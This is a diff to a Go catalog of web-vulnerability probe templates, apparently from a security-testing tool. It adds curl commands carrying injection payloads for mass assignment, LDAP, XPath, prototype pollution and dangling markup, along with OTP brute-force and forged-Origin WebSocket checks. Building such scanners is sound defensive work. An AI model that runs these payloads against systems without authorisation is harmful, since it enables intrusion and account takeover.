@@ -362,8 +362,8 @@ var catalog = []Technique{
 	// ── Mass Assignment ───────────────────────────────────────────────────────
 	{
 		Category:      "mass_assignment",
-		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/mass-assignment",
-		Description:   "Mass assignment: inject hidden fields (role, isAdmin) into POST/PUT bodies.",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/mass-assignment.html",
+		Description:   "Mass assignment: inject privileged fields into writable JSON objects.",
 		CommandTemplates: []CommandTemplate{
 			{
 				Binary: "curl",
@@ -371,10 +371,10 @@ var catalog = []Technique{
 					"-sk", "{{TARGET}}",
 					"-X", "POST",
 					"-H", "Content-Type: application/json",
-					"-d", `{"role":"admin","isAdmin":true,"is_admin":1}`,
-					"-o", "/dev/null", "-w", "%{http_code}",
+					"-d", `{"role":"admin","isAdmin":true,"verified":true}`,
+					"-i",
 				},
-				Description: "Mass assignment: inject admin role fields into POST body",
+				Description: "Inject privileged fields to detect missing server-side allowlists",
 			},
 		},
 	},
@@ -436,6 +436,162 @@ var catalog = []Technique{
 					"-o", "/dev/null", "-w", "%{http_code}",
 				},
 				Description: "CL.TE smuggling probe with minimal chunk body",
+			},
+		},
+	},
+	// ── Clickjacking ──────────────────────────────────────────────────────────
+	{
+		Category:      "clickjacking",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/clickjacking.html",
+		Description:   "Check whether framing protections are missing.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-skI", "{{TARGET}}"},
+				Description:  "Inspect X-Frame-Options and CSP frame-ancestors headers",
+			},
+		},
+	},
+	// ── LDAP Injection ────────────────────────────────────────────────────────
+	{
+		Category:      "ldap_injection",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/ldap-injection.html",
+		Description:   "Inject LDAP metacharacters into common directory query parameters.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=*)(uid=*))(|(uid=*", "-i"},
+				Description:  "LDAP error/bypass probe via query parameter injection",
+			},
+		},
+	},
+	// ── Cache Deception ───────────────────────────────────────────────────────
+	{
+		Category:      "cache_deception",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/cache-deception.html",
+		Description:   "Append static-looking suffixes to dynamic authenticated routes.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-skI", "{{TARGET}}/profile.css"},
+				Description:  "Check whether dynamic content is cached under a static-looking path",
+			},
+		},
+	},
+	// ── Account Enumeration ───────────────────────────────────────────────────
+	{
+		Category:      "account_enumeration",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/login-bypass/password-enumeration.html",
+		Description:   "Compare login/reset responses for valid and invalid usernames.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-X", "POST", "-d", "username=admin&******", "-w", "%{time_total} %{http_code}", "-o", "/dev/null"},
+				Description:  "Timing and status comparison for likely-valid usernames",
+			},
+		},
+	},
+	// ── XPath Injection ───────────────────────────────────────────────────────
+	{
+		Category:      "xpath_injection",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/xpath-injection.html",
+		Description:   "Inject XPath metacharacters into XML-backed queries.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=' or '1'='1", "-i"},
+				Description:  "XPath parser-error probe with a boolean-style payload",
+			},
+		},
+	},
+	// ── Formula Injection ─────────────────────────────────────────────────────
+	{
+		Category:      "formula_injection",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/formula-csv-injection.html",
+		Description:   "Check whether spreadsheet formulas are accepted intact.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}==abh_formula_7f9e2", "-i"},
+				Description:  "Reflection probe for CSV/formula injection markers",
+			},
+		},
+	},
+	// ── Prototype Pollution ───────────────────────────────────────────────────
+	{
+		Category:      "prototype_pollution",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution.html",
+		Description:   "Test for server-side prototype pollution sinks.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}?__proto__[polluted]=abh_pp_7f9e2", "-i"},
+				Description:  "Inject __proto__ query parameters and inspect follow-up responses",
+			},
+		},
+	},
+	// ── SAML ──────────────────────────────────────────────────────────────────
+	{
+		Category:      "saml",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/saml-attacks.html",
+		Description:   "Enumerate SAML SSO endpoints and acceptance behavior.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}/saml", "-i"},
+				Description:  "Check for exposed SAML/SP endpoints and weak error handling",
+			},
+		},
+	},
+	// ── MFA Bypass ────────────────────────────────────────────────────────────
+	{
+		Category:      "mfa_bypass",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/login-bypass/multi-factor-authentication-bypass.html",
+		Description:   "Probe MFA verification flows for brute-force and step-skip weaknesses.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}/otp", "-X", "POST", "-d", "otp=000000", "-i"},
+				Description:  "Rapid OTP submission to assess rate limiting on MFA verification",
+			},
+		},
+	},
+	// ── CSP Bypass ────────────────────────────────────────────────────────────
+	{
+		Category:      "csp_bypass",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/",
+		Description:   "Inspect CSP for weak script restrictions and trusted CDN bypasses.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-skI", "{{TARGET}}"},
+				Description:  "Inspect Content-Security-Policy for unsafe-inline, wildcards, and risky CDNs",
+			},
+		},
+	},
+	// ── Dangling Markup ───────────────────────────────────────────────────────
+	{
+		Category:      "dangling_markup",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dangling-markup.html",
+		Description:   "Probe for partial HTML injection that enables dangling-markup exfiltration.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=<img src=//abh-dangling.invalid/", "-i"},
+				Description:  "Reflect a partial IMG tag to test attribute-context HTML injection",
+			},
+		},
+	},
+	// ── WebSocket ─────────────────────────────────────────────────────────────
+	{
+		Category:      "websocket",
+		HackTricksURL: "https://hacktricks.wiki/en/pentesting-web/websocket-attacks.html",
+		Description:   "Probe WebSocket handshakes for origin validation and auth gaps.",
+		CommandTemplates: []CommandTemplate{
+			{
+				Binary:       "curl",
+				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-H", "Connection: Upgrade", "-H", "Upgrade: websocket", "-H", "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==", "-H", "Sec-WebSocket-Version: 13", "-H", "Origin: https://evil.example.com", "-i"},
+				Description:  "WebSocket upgrade handshake with attacker-controlled Origin",
 			},
 		},
 	},
